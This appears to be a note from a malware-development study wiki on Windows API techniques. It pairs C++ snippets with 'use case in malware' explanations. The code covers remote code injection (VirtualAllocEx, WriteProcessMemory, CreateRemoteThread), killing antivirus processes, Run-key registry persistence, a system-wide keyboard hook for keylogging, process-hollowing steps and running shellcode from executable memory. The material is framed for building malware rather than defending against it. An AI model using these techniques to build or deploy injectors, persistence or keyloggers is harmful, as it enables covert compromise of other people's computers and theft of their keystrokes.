# Index 
- [[2. Key C++ Concepts for Malware]]
	- [[2.1 Windows API (WinAPI) for Malware Development]]
	- [[2.2 Code Obfuscation Techniques]]
	- [[2.3 PE File Structure and Manipulation]]
	- [[2.4 DLL Injection Techniques]]

# Process Creation and Manipulation

Creating and manipulating processes is fundamental for many types of malware, including those that attempt to hide their presence by injecting code into legitimate processes or creating new ones to execute malicious actions.

#### CreateProcess
The `CreateProcess` function is used to launch a new process. Malware can use this to spawn a legitimate process (e.g., `notepad.exe`, `svchost.exe`) and then inject malicious code into it.

```cpp
#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Launching a legitimate process
    if (CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cout << "Process created successfully." << std::endl;
        
        // Wait for the process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
    }

    return 0;
}
```

- Use Case in Malware: After creating a new process, malware can inject code or hijack this newly created process, making it appear as if the malicious code is being executed by a legitimate process.

#### OpenProcess
`OpenProcess` is used to obtain a handle to an existing process. This handle is necessary for manipulating or injecting code into the process.

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessID);
if (hProcess == NULL) {
    std::cerr << "Failed to open process: " << GetLastError() << std::endl;
} else {
    // Process successfully opened, proceed with manipulation
    CloseHandle(hProcess);
}
```

- Use Case in Malware: A typical malware tactic is to open a legitimate process, such as `explorer.exe`, and inject malicious code into it, allowing the malware to execute in the context of a trusted process.

#### TerminateProcess
`TerminateProcess` is used to forcefully terminate a running process. Malware might use this to kill processes that are defensive in nature, such as antivirus or other security tools.

```cpp
DWORD targetProcessID = 1234;  // Target process ID
HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, targetProcessID);

if (TerminateProcess(hProcess, 0)) {
    std::cout << "Process terminated successfully." << std::endl;
} else {
    std::cerr << "Failed to terminate process: " << GetLastError() << std::endl;
}

CloseHandle(hProcess);
```

- Use Case in Malware: This function can be used by malware to kill security-related processes such as AV or sandboxing applications, increasing the chances of undetected execution.

# Memory Manipulation

Memory manipulation is crucial for malware to execute code in other processes' memory spaces. This allows the malware to avoid detection by hiding its code within the memory of a legitimate process.

#### VirtualAllocEx
`VirtualAllocEx` allocates memory in the address space of a target process. It’s a key function for implementing code injection.

```cpp
LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (remoteMemory == NULL) {
    std::cerr << "Failed to allocate memory: " << GetLastError() << std::endl;
} else {
    std::cout << "Memory allocated successfully." << std::endl;
}
```

- Use Case in Malware: After opening a target process with `OpenProcess`, `VirtualAllocEx` can allocate a section of memory where the malware will inject its malicious code.

#### WriteProcessMemory
`WriteProcessMemory` writes data into the memory of a target process. Combined with `VirtualAllocEx`, this allows malware to place its malicious payload into another process.

```cpp
BOOL result = WriteProcessMemory(hProcess, remoteMemory, maliciousCode, maliciousCodeSize, NULL);
if (result == 0) {
    std::cerr << "Failed to write memory: " << GetLastError() << std::endl;
} else {
    std::cout << "Memory written successfully." << std::endl;
}
```

- Use Case in Malware: After allocating memory with `VirtualAllocEx`, `WriteProcessMemory` writes the malicious payload into the target process’s memory. This is often followed by `CreateRemoteThread` to execute the payload.

#### CreateRemoteThread
`CreateRemoteThread` starts a new thread in the context of another process. This is often used in conjunction with `VirtualAllocEx` and `WriteProcessMemory` to execute malicious code within the context of a legitimate process.

```cpp
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
if (hThread == NULL) {
    std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
} else {
    std::cout << "Remote thread created successfully." << std::endl;
    CloseHandle(hThread);
}
```

- Use Case in Malware: This function is commonly used in process injection attacks, where the malware executes its code inside a legitimate process to hide its activities from detection tools.

# File and Registry Manipulation

Manipulating files and the registry allows malware to persist on the system, hide its presence, and interact with system resources.

#### CreateFile
`CreateFile` is used to open or create a file. Malware may use this to create or modify system files, log keystrokes, or store data.

```cpp
HANDLE hFile = CreateFile("C:\\test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written;
    WriteFile(hFile, "Malicious data", 14, &written, NULL);
    CloseHandle(hFile);
}
```

- Use Case in Malware: Malware can use this function to create files that store malicious payloads or to overwrite legitimate system files.

#### RegOpenKeyEx, RegSetValueEx
The Windows Registry is a common target for malware because it allows the program to persist across reboots. The following code adds a registry key that will run malware on startup.

```cpp
HKEY hKey;
LONG lRes = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
if (lRes == ERROR_SUCCESS) {
    const char* data = "C:\\malware.exe";
    RegSetValueEx(hKey, "MalwareKey", 0, REG_SZ, (BYTE*)data, strlen(data) + 1);
    RegCloseKey(hKey);
}
```

- Use Case in Malware: Malware can add registry entries to ensure persistence. For example, it can add itself to the "Run" registry key, so it executes every time the system boots.

# Advanced Techniques for WinAPI in Malware Development

Some advanced techniques using the Windows API are particularly useful for evading detection and increasing persistence.

#### Process Hollowing
Process hollowing is a technique where malware spawns a legitimate process in a suspended state, unmaps its memory, and replaces it with malicious code. This hides the malicious code under the guise of a trusted process.

1. Use `CreateProcess` with the `CREATE_SUSPENDED` flag to create a process in a suspended state.
2. Use `ZwUnmapViewOfSection` (part of NTDLL) to unmap the legitimate process memory.
3. Use `WriteProcessMemory` to inject malicious code into the unallocated memory space.
4. Use `ResumeThread` to start executing the injected code.

#### DLL Injection via SetWindowsHookEx
`SetWindowsHookEx` can be used to inject a DLL into every process in a session by registering a Windows hook.

```cpp
HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hModule, 0);
```

- Use Case in Malware: This technique can be used for keylogging or injecting a malicious DLL into system-wide processes. Since hooks are commonly used for legitimate purposes, this makes the injection harder to detect.

#### Shellcode Execution
Shellcode is a small piece of code, typically written in assembly, that executes a specific payload. WinAPI functions can be used to allocate memory for the shellcode and execute it.

1. VirtualAlloc allocates executable memory.
2. memcpy or WriteProcessMemory writes the shellcode into the allocated memory.
3. CreateThread or CreateRemoteThread executes the shellcode.

```cpp
LPVOID execMemory = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(execMemory, shellcode, payloadSize);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 

0, NULL);
```

- Use Case in Malware: Shellcode is often used in exploits to run small payloads, such as spawning a reverse shell, injecting malicious DLLs, or executing arbitrary code in the context of a vulnerable process.